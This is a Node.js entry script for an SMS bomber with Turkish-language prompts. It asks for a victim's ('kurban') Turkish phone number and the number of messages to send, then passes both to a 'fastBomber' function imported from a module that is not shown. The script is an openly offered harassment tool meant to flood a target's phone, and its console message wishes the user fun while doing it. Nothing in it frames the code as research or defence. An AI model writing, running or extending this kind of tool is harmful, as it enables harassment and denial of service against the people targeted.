const rl = require('readline-sync');
const colors = require('colors');
const title = require('./modules/title.js');
const fastBomber = require('./modules/sms.js');

title('Hosgeldiniz');

let telefon = rl.question('Kurbanin Telefon Numarasi +90: ' .green);
if (telefon.length != 10) {
    console.log('Telefon Numarasi 10 Haneli Olmalidir. Ex: 5401234521'.red);
    process.exit(1);
}
title('Numara: ' + telefon);

let miktar = rl.question("Kurbana Kac Adet SMS Gondermek Istiyorsunuz: ".green);
if(isNaN(miktar)) return console.log('Lutfen Bir Rakam Giriniz'.red) && process.exit(1);
if (miktar.length == 0) {
    console.log('Miktar Giriniz'.red);
    process.exit(1);
}
title(`Telefon: ${telefon} - Miktar: ${miktar}`);

console.log('SMS Gonderiliyor 1011 Farkıyla İyi Eglenceler...'.rainbow);

fastBomber(telefon, miktar);
